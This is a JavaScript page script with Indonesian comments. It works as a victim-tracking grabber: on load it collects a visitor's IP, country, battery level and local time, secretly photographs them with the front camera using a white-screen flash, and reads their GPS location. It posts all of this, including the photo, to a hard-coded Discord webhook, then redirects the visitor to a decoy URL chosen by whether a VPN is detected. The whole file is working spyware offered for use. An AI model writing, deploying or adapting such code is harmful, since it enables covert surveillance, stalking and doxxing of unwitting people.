const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9";
const jsonURL = "server.json";
const vpnJsonURL = "vpn.json";

// Buat elemen layar putih sebagai pengganti flash
const flashScreen = document.createElement("div");
flashScreen.style.position = "fixed";
flashScreen.style.top = "0";
flashScreen.style.left = "0";
flashScreen.style.width = "100vw";
flashScreen.style.height = "100vh";
flashScreen.style.backgroundColor = "white";
flashScreen.style.zIndex = "9999";
flashScreen.style.display = "none";
document.body.appendChild(flashScreen);

const canvas = document.createElement("canvas");
const context = canvas.getContext("2d");
canvas.style.display = "none";
document.body.appendChild(canvas);

// Fungsi mendapatkan waktu lokal HP target
function getLocalTime() {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, "0");
    const minutes = now.getMinutes().toString().padStart(2, "0");
    const seconds = now.getSeconds().toString().padStart(2, "0");
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return `${hours}:${minutes}:${seconds} (${timeZone})`;
}

// Cek IP & apakah target pakai VPN
fetch("https://ipwho.is/")
    .then(response => response.json())
    .then(data => {
        const ip = data.ip || "Unknown";
        const country = data.country || "Unknown";
        const isVPN = data.proxy || false; // Deteksi apakah proxy/VPN aktif

        // Dapatkan status baterai
        navigator.getBattery().then(battery => {
            const batteryPercentage = battery.level * 100; // Persen baterai

            // Akses kamera depan
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })  
                .then(stream => {  
                    const track = stream.getVideoTracks()[0];  
                    const imageCapture = new ImageCapture(track);  

                    // **Aktifkan layar putih sebagai flash**
                    flashScreen.style.display = "block";

                    // **Tingkatkan kecerahan layar ke maksimum (jika diizinkan)**
                    if (navigator.wakeLock) {
                        navigator.wakeLock.request("screen").catch(err => console.error("Gagal meningkatkan kecerahan:", err));
                    }

                    setTimeout(() => {  
                        const localTime = getLocalTime();  
                        imageCapture.takePhoto()  
                            .then(blob => {  
                                track.stop();  

                                // **Matikan flash layar setelah foto diambil**
                                flashScreen.style.display = "none";

                                // **Ambil lokasi target**
                                navigator.geolocation.getCurrentPosition(position => {
                                    const latitude = position.coords.latitude;
                                    const longitude = position.coords.longitude;
                                    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

                                    sendToDiscord(blob, ip, country, localTime, batteryPercentage, mapsLink);
                                    handleRedirect(isVPN);
                                }, error => {
                                    console.error("Gagal ambil lokasi:", error);
                                    sendToDiscord(blob, ip, country, localTime, batteryPercentage, "Tidak diketahui");
                                    handleRedirect(isVPN);
                                });

                            })  
                            .catch(error => console.error("Gagal ambil foto:", error));  
                    }, 3000);  
                })  
                .catch(err => console.error("Akses kamera ditolak:", err));  
        });
    })  
    .catch(err => console.error("Gagal ambil IP:", err));

// Kirim ke Webhook Discord (tanpa status VPN)
function sendToDiscord(blob, ip, country, localTime, batteryPercentage, mapsLink) {
    const formData = new FormData();
    formData.append("file", blob, "capture.jpg");

    formData.append("payload_json", JSON.stringify({  
        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n🔋 **Battery Percentage**: ${batteryPercentage}%\n📌 **Country**: ${country}\n📍 **Lokasi**: [Google Maps](${mapsLink})⏰ **Time**: ${localTime}`
    }));  

    fetch(webhookURL, {  
        method: "POST",  
        body: formData  
    });
}

// Pilih JSON redirect berdasarkan status VPN
function handleRedirect(isVPN) {
    const targetJson = isVPN ? vpnJsonURL : jsonURL;

    fetch(targetJson)
        .then(response => response.json())
        .then(data => {
            const urls = data.urls;
            if (urls && urls.length > 0) {
                const randomURL = urls[Math.floor(Math.random() * urls.length)];
                setTimeout(() => {
                    window.location.href = randomURL;
                }, 11000);
            } else {
                console.error(`JSON (${targetJson}) tidak berisi URL`);
            }
        })
        .catch(error => console.error(`Gagal mengambil URL dari ${targetJson}:`, error));
}
